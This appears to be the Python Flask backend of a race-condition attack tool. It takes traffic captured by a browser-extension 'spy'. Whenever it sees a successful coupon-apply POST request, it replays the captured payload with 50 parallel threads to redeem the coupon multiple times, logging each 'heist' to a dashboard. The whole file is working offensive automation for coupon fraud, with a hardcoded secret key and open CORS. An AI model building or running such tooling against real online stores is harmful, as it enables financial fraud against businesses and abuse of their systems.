from flask import Flask, jsonify
from flask_sock import Sock
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import json
import threading
from hammer import Hammer
from colorama import Fore
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'antigravity_secret'
sock = Sock(app)
CORS(app)
# Initialize SocketIO for real-time communication with the React Frontend
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Store attack logs
ATTACK_LOGS = []

def trigger_heist(url, payload):
    """Launches the attack in a separate thread and broadcasts progress."""
    print(f"{Fore.MAGENTA}[!] BRAIN: DETECTED VULNERABLE ENDPOINT. INITIATING HEIST.")
    
    # Notify Frontend: Heist Started
    socketio.emit('ledger_update', {
        "id": f"HEIST-{int(time.time())}",
        "timestamp": time.time() * 1000, # JS expects ms
        "method": "HAMMER",
        "url": url,
        "status": "RACE_CANDIDATE",
        "details": "HEIST INITIATED: 50 Threads Primed"
    })

    # 1. Prepare
    hammer = Hammer(target_url=url, json_payload=payload, threads=50)
    hammer.prepare()
    
    # 2. Fire
    hits = hammer.fire()
    
    # 3. Log & Notify
    verdict = "VULNERABLE" if hits > 1 else "SECURE"
    status_code = "RACE_CANDIDATE" if hits > 1 else "SAFE"
    
    log_entry = {
        "id": f"REPORT-{int(time.time())}",
        "timestamp": time.time() * 1000,
        "method": "REPORT",
        "url": url,
        "status": status_code,
        "details": f"HEIST COMPLETE. Hits: {hits}. Verdict: {verdict}"
    }
    ATTACK_LOGS.append(log_entry)
    
    print(f"{Fore.GREEN}[$] HEIST COMPLETE. Successful parallel requests: {hits}")

    # Broadcast final result to Dashboard
    socketio.emit('ledger_update', log_entry)

@sock.route('/stream')
def stream(ws):
    """WebSocket endpoint for the Chrome Extension Spy (Raw WS)."""
    while True:
        try:
            data = ws.receive()
            if not data: break
            
            packet = json.loads(data)
            if packet.get("type") == "ping": continue

            method = packet.get("method")
            url = packet.get("url")
            status = packet.get("status")

            # Forward traffic summary to Dashboard for "Live Traffic" feel
            socketio.emit('traffic_log', packet) 

            # TRIGGER LOGIC
            if method == "POST" and "/api/apply" in url and status == 200:
                print(f"{Fore.YELLOW}[?] BRAIN: Intercepted Coupon Usage. Replaying...")
                
                try:
                    payload = json.loads(packet.get("request_body"))
                except:
                    payload = {"code": "WELCOME50"}

                t = threading.Thread(target=trigger_heist, args=(url, payload))
                t.start()
        except Exception as e:
            print(f"Socket Error: {e}")
            break

@app.route('/logs', methods=['GET'])
def get_logs():
    return jsonify(ATTACK_LOGS)

if __name__ == "__main__":
    print(f"{Fore.CYAN}[-] ANTIGRAVITY BRAIN LISTENING ON PORT 5000 (SocketIO + WS)...")
    # Use socketio.run instead of app.run to enable Engine.IO support
    socketio.run(app, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
